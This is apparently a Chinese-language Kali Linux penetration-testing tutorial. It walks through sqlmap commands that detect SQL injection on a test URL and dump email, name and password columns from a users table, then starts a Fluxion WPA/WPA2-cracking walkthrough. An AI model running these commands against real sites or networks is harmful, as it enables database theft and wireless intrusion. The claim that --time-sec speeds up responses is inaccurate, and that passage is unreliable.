    # 引言


    渗透测试是一种很好的技术，可以帮助你保持系统安全。它可以帮助你识别系统中的任何漏洞或弱点（通常称为漏洞）。在系统部署到生产环境之前，尽早检测这些漏洞总是好的，有助于保持安全。一旦检测到这些漏洞，你就可以进行封堵。这表明了对系统进行渗透测试的重要性。Kali
    Linux 是渗透测试的最佳操作系统。本书将指导你如何进行操作！


    # 第 1 章- 使用 Sqlmap 破解网站


    Sqlmap 仅仅一个让我们轻松进行 SQL 注入的工具。该工具是开源的，可用于渗透测试，实现检测和利用 SQL 注入漏洞的自动化，进而接管数据库服务器。


    ### 该工具具有非常强大的检测引擎以及其他可用于渗透测试的工具。你可以使用该工具进行数据库指纹、从数据库获取数据、访问文件系统以及在你的操作系统上执行命令。


    ### Sqlmap 完全支持 Oracle、MySQL、PostgreSQL、Microsoft Access、IBM DB2、Firebird、Sybase、SQLite
    SAP MaxDB 和 Microsoft SQL Server 数据库管理系统。这意味着几乎支持所有可用数据库管理系统。


    ### 在本章中，我们将展示如何在 Kali Linux 中使用 Sqlmap 破解网站。可以通过以下步骤实现：启动运行 Kali Linux 的机器。打开终端，输入以下命令：


    ```bash

    sqlmap -h

    ```


    将列出 SqlMap 支持的所有基本命令。我们可以从执行一个简单的命令开始，指定要注入的 URL。如下所示。它应该采用以下语法：


    ```bash

    sqlmap -u <要注入的 URL>

    ```


    在我们的案例中，命令所示：


    ```bash

    sqlmap -u http://testphp.productweb.com/showproducts.php?cat=1

    ```


    有时，服务器的响应可能会很慢。在这种情况下，我们可以使用 `--time-sec`，这将有助于加速服务器的响应。可以像下面的命令所示添加：


    ```bash

    sqlmap -u http://testphp.productweb.com/showproducts.php?cat=1 --time-sec 15

    ```


    一旦完成上述命令，你将被你正在使用的 MySQL 版本以及有关你系统的相关信息。


    注意，在执行命令时，系统可能会提示你回答是或否，这由作者决定。


    ### 数据库


    我们想要获取数据库名称。首先，我们将使用 `--dbs` 选项列出数据库。如下：


    ```bash

    sqlmap -u http://testphp.productweb.com/showproducts.php?cat=1 --dbs

    ```


    ### 表


    我们对表感兴趣。我们将使用 `--tables` 选项列出表。你的命令应该如下：


    ```bash

    sqlmap -u http://testphp.productweb.com/showproducts.php?cat=1 -D acuart --tables

    ```


    ### 数据


    我们现在应该从更多列中获取数据。我们仍然使用 `-D` 指定数据库，`-T` 指定表，`-C` 指定列。


    ```bash

    sqlmap -u http://testphp.productweb.com/showproducts.php?cat=1 -D acuart -T users
    -C email,name,pass --dump

    ```


    # 第 2 章- 如何在不暴力破解的情况下破解 WPA/WPA2


    Fluxion 是一个基于 linset 的脚本。事实上，它是后者的改进，修复了一些错误并提供了一些额外的选项。此工具应仅在你拥拥的网络上使用。


    ### Fluxion


    为了获取该脚本，你需要克隆 GitHub 仓库。可以使用 `git` 命令行工具执行此操作，所示：


    ```bash

    git clone https://github.com/deltaxflux/fluxion

    ```


    ### 运行脚本


    现在你已经手动下载了脚本，可以导航到存储它们的目录。在这种情况下，你只需要使用 `cd` 命令切换到 fluxion 目录。所示：


    ```bash

    cd fluxion

    ```


    然后你可以使用 sudo 权限运行脚本。以下命令演示了这一点：


    ```bash

    sudo ./fluxion

    ```


